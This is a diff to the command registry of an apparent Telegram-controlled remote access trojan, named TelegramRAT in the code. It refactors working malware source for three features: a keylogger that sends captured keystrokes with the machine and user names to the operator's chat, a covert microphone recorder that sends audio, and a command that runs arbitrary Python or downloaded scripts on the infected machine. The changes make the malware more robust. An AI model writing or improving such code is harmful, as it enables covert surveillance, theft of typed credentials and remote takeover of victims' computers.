@@ -7,12 +7,16 @@ using TelegramRAT.Features;
 using IronPython.Hosting;
 using System.Diagnostics;
 using Telegram.Bot.Types;
+using Telegram.Bot.Types.InputFiles;
 using System.Drawing;
 using Telegram.Bot;
 using WindowsInput;
 using NAudio.Wave;
 using System.Text;
 using System.Net;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
 
 namespace TelegramRAT.Commands;
 
@@ -1152,63 +1156,98 @@ public static class CommandRegistry
             Description = "Keylog starts and ends with no args.",
             Execute = async model =>
             {
-                await Task.Run(async () =>
+                try
                 {
-                    try
+                    if (KeylogActive)
                     {
-                        if (KeylogActive)
-                        {
-                            KeylogActive = false;
-                            return;
-                        }
-                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Keylog started!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                        KeylogActive = true;
+                        KeylogActive = false;
+                        return;
+                    }
 
-                        StringBuilder mappedKeys = new StringBuilder();
-                        StringBuilder unmappedKeys = new StringBuilder();
-                        List<uint> LastKeys = new List<uint>();
-                        List<uint> shit = new List<uint>();
-                        while (KeylogActive)
+                    await Program.Bot.SendMessage(
+                        model.Message.Chat.Id,
+                        "Keylog started!",
+                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+
+                    KeylogActive = true;
+
+                    StringBuilder mappedKeys = new StringBuilder();
+                    StringBuilder unmappedKeys = new StringBuilder();
+                    List<uint> lastKeys = new List<uint>();
+
+                    while (KeylogActive)
+                    {
+                        var keys = Keylogger.GetPressingKeys();
+                        if (!lastKeys.SequenceEqual(keys))
                         {
-                            shit.Clear();
-                            var keys = Keylogger.GetPressingKeys();
-                            if (LastKeys.SequenceEqual(keys) is not true)
+                            foreach (var key in keys)
                             {
-                                foreach (var key in keys)
-                                {
-                                    unmappedKeys.Append(key.ToString("X") + ";");
-                                    mappedKeys.Append(WinAPI.MapVirtualKey(key));
-                                    mappedKeys.Append(' ');
-                                    unmappedKeys.Append(' ');
-                                }
-                                LastKeys = keys;
+                                unmappedKeys.Append(key.ToString("X"));
+                                unmappedKeys.Append(';');
+                                mappedKeys.Append(WinAPI.MapVirtualKey(key));
+                                mappedKeys.Append(' ');
+                                unmappedKeys.Append(' ');
                             }
 
-                            await Task.Delay(50);
+                            lastKeys = new List<uint>(keys);
                         }
-                        using (FileStream keylogFileStream = File.Create("keylog.txt"))
-                        {
-                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
-                            streamWriter.WriteLine("#Mapped keylog:");
-                            streamWriter.WriteLine(mappedKeys.ToString());
-                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
-                            streamWriter.WriteLine(unmappedKeys.ToString());
-                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
-                            streamWriter.Close();
-                        }
-                        await Program.Bot.SendMessage(model.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());
 
-                        using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
-                        {
-                            Program.Bot.SendDocument(model.Message.From.Id, new InputFileStream(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
-                        }
-                        File.Delete("keylog.txt");
+                        await Task.Delay(50);
                     }
-                    catch (Exception ex)
+
+                    await using var keylogFileStream = new FileStream(
+                        "keylog.txt",
+                        FileMode.Create,
+                        FileAccess.Write,
+                        FileShare.None,
+                        bufferSize: 4096,
+                        useAsync: true);
+                    using var streamWriter = new StreamWriter(
+                        keylogFileStream,
+                        Encoding.UTF8,
+                        bufferSize: 1024,
+                        leaveOpen: true);
+                    await streamWriter.WriteLineAsync("#Mapped keylog:");
+                    await streamWriter.WriteLineAsync(mappedKeys.ToString());
+                    await streamWriter.WriteLineAsync("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
+                    await streamWriter.WriteLineAsync(unmappedKeys.ToString());
+                    await streamWriter.WriteLineAsync("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
+
+                    var recipientId = model.Message.From?.Id ?? model.Message.Chat.Id;
+
+                    await Program.Bot.SendMessage(
+                        recipientId,
+                        "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys);
+
+                    await using var fs = new FileStream(
+                        "keylog.txt",
+                        FileMode.Open,
+                        FileAccess.Read,
+                        FileShare.Read,
+                        bufferSize: 4096,
+                        useAsync: true);
+                    var inputFile = new InputFileStream(fs, fileName: "keylog.txt");
+                    await Program.Bot.SendDocument(
+                        recipientId,
+                        inputFile,
+                        caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName);
+
+                    File.Delete("keylog.txt");
+                }
+                catch (Exception ex)
+                {
+                    KeylogActive = false;
+                    try
                     {
-                        await Program.ReportExceptionAsync(model.Message, ex);
+                        if (File.Exists("keylog.txt"))
+                            File.Delete("keylog.txt");
                     }
-                });
+                    catch
+                    {
+                        // ignored
+                    }
+                    await Program.ReportExceptionAsync(model.Message, ex);
+                }
             }
         });
 
@@ -1220,58 +1259,62 @@ public static class CommandRegistry
             Example = "/audio 50",
             Execute = async model =>
             {
-                await Task.Run(async () =>
+                try
                 {
-                    try
+                    if (WaveInEvent.DeviceCount == 0)
                     {
-                        if (WaveInEvent.DeviceCount == 0)
-                        {
-                            await Program.Bot.SendMessage(model.Message.Chat.Id, "This machine has no audio input devices, the recording isn't possible.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                            return;
-                        }
-
-                        if (uint.TryParse(model.Args[0], out uint recordLength) is false)
-                        {
-                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Argument must be a positive integer!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                            return;
-                        }
-
-                        WaveInEvent waveIn2 = new WaveInEvent();
-
-                        waveIn2.WaveFormat = new WaveFormat(44100, 1);
-                        MemoryStream memstrm = new MemoryStream();
-                        WaveFileWriter waveFileWriter2 = new WaveFileWriter(memstrm, waveIn2.WaveFormat);
-
-                        waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((sender, args) =>
-                        {
-                            if (waveFileWriter2 != null)
-                            {
-                                waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
-                                waveFileWriter2.Flush();
-                            }
-                        });
-
-                        waveIn2.StartRecording();
-                        await Program.Bot.SendMessage(model.Message.Chat.Id, "Start recording", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                        await Program.Bot.SendChatAction(model.Message.Chat.Id, ChatAction.RecordVoice);
-                        Task.Delay((int)recordLength * 1000).Wait();
-
-                        waveIn2.StopRecording();
-
-                        memstrm.Position = 0;
-
-                        Program.Bot.SendVoice(model.Message.Chat.Id, new InputFileStream(memstrm, fileName: "record"), replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }).Wait();
-
-                        waveIn2.Dispose();
-                        memstrm.Close();
-
-                    }
-                    catch (Exception ex)
-                    {
-                        await Program.ReportExceptionAsync(model.Message, ex);
+                        await Program.Bot.SendMessage(
+                            model.Message.Chat.Id,
+                            "This machine has no audio input devices, the recording isn't possible.",
+                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                        return;
                     }
 
-                });
+                    if (!uint.TryParse(model.Args[0], out uint recordLength))
+                    {
+                        await Program.Bot.SendMessage(
+                            model.Message.Chat.Id,
+                            "Argument must be a positive integer!",
+                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                        return;
+                    }
+
+                    using WaveInEvent waveIn2 = new WaveInEvent
+                    {
+                        WaveFormat = new WaveFormat(44100, 1)
+                    };
+
+                    using MemoryStream memstrm = new MemoryStream();
+                    using WaveFileWriter waveFileWriter2 = new WaveFileWriter(memstrm, waveIn2.WaveFormat);
+
+                    waveIn2.DataAvailable += (_, args) =>
+                    {
+                        waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
+                        waveFileWriter2.Flush();
+                    };
+
+                    waveIn2.StartRecording();
+                    await Program.Bot.SendMessage(
+                        model.Message.Chat.Id,
+                        "Start recording",
+                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                    await Program.Bot.SendChatAction(model.Message.Chat.Id, ChatAction.RecordVoice);
+
+                    await Task.Delay(TimeSpan.FromSeconds(recordLength));
+
+                    waveIn2.StopRecording();
+
+                    memstrm.Position = 0;
+
+                    await Program.Bot.SendVoice(
+                        model.Message.Chat.Id,
+                        new InputFileStream(memstrm, fileName: "record"),
+                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                }
+                catch (Exception ex)
+                {
+                    await Program.ReportExceptionAsync(model.Message, ex);
+                }
             }
         });
     }
@@ -1286,72 +1329,109 @@ public static class CommandRegistry
             Example = "/py print('Hello World')",
             Execute = async model =>
             {
-                await Task.Run(async () =>
+                try
                 {
-                    try
+                    if (model.Files.Length == 0)
                     {
-                        if (model.Files.Length == 0)
+                        if (model.Args.Length == 0)
                         {
-                            if (model.Args.Length == 0)
-                            {
-                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Need an expression or file to execute", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                                return;
-                            }
-                            MemoryStream pyOutput = new MemoryStream();
-                            var pyStream = new MemoryStream();
-                            PythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
-
-                            PythonEngine.Execute(model.RawArgs, PythonScope);
-                            pyStream.Position = 0;
-
-                            if (pyStream.Length > 0)
-                            {
-                                string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
-                                await Program.Bot.SendMessage(model.Message.Chat.Id, $"Executed! Output:\n{output}", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                            }
-                            else
-                            {
-                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Executed!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                            }
-                            pyStream.Close();
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                "Need an expression or file to execute",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                             return;
                         }
-                        if (model.Filename != null && model.Filename.Contains(".py"))
+
+                        using var pyStream = new MemoryStream();
+                        PythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+
+                        PythonEngine.Execute(model.RawArgs, PythonScope);
+                        pyStream.Position = 0;
+
+                        if (pyStream.Length > 0)
                         {
-                            MemoryStream outputStream = new MemoryStream();
-                            var scriptFileStream = File.Create("UserScript.py");
-                            PythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
-
-                            var file = Program.Bot.GetFile(model.Files[0].FileId).Result;
-                            Program.Bot.DownloadFile(file.FilePath, scriptFileStream).Wait();
-                            scriptFileStream.Close();
-
-                            PythonEngine.ExecuteFile("UserScript.py", PythonScope);
-
-                            outputStream.Position = 0;
-
-                            string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));
-
-                            if (outputText.Length > 0)
-                                await Program.Bot.SendMessage(model.Message.Chat.Id, $"Executed! Output: {outputText}", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-                            else
-                                await Program.Bot.SendMessage(model.Message.Chat.Id, $"Executed!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
-
-                            File.Delete("UserScript.py");
-                            outputStream.Close();
-                            return;
+                            using var reader = new StreamReader(pyStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true, bufferSize: 1024, leaveOpen: false);
+                            string output = new string(reader.ReadToEnd().Take(4096).ToArray());
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                $"Executed! Output:\n{output}",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                         }
                         else
                         {
-                            await Program.Bot.SendMessage(model.Message.Chat.Id, "This file is not a python script!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                "Executed!",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        await Program.ReportExceptionAsync(model.Message, ex);
+                        return;
                     }
 
-                });
+                    if (model.Filename != null && model.Filename.Contains(".py"))
+                    {
+                        using var outputStream = new MemoryStream();
+                        PythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
+
+                        var file = await Program.Bot.GetFile(model.Files[0].FileId);
+                        await using (var scriptFileStream = new FileStream(
+                                   "UserScript.py",
+                                   FileMode.Create,
+                                   FileAccess.Write,
+                                   FileShare.None,
+                                   bufferSize: 4096,
+                                   useAsync: true))
+                        {
+                            await Program.Bot.DownloadFile(file.FilePath, scriptFileStream);
+                        }
+
+                        PythonEngine.ExecuteFile("UserScript.py", PythonScope);
+
+                        outputStream.Position = 0;
+
+                        using var reader = new StreamReader(outputStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true, bufferSize: 1024, leaveOpen: false);
+                        string outputText = new string(reader.ReadToEnd().Take(4096).ToArray());
+
+                        if (outputText.Length > 0)
+                        {
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                $"Executed! Output: {outputText}",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                        }
+                        else
+                        {
+                            await Program.Bot.SendMessage(
+                                model.Message.Chat.Id,
+                                "Executed!",
+                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                        }
+
+                        File.Delete("UserScript.py");
+                        return;
+                    }
+
+                    await Program.Bot.SendMessage(
+                        model.Message.Chat.Id,
+                        "This file is not a python script!",
+                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
+                }
+                catch (Exception ex)
+                {
+                    try
+                    {
+                        if (File.Exists("UserScript.py"))
+                            File.Delete("UserScript.py");
+                    }
+                    catch
+                    {
+                        // ignored
+                    }
+                    await Program.ReportExceptionAsync(model.Message, ex);
+                }
+                finally
+                {
+                    PythonEngine.Runtime.IO.SetOutput(Stream.Null, Encoding.UTF8);
+                }
             }
         });
 
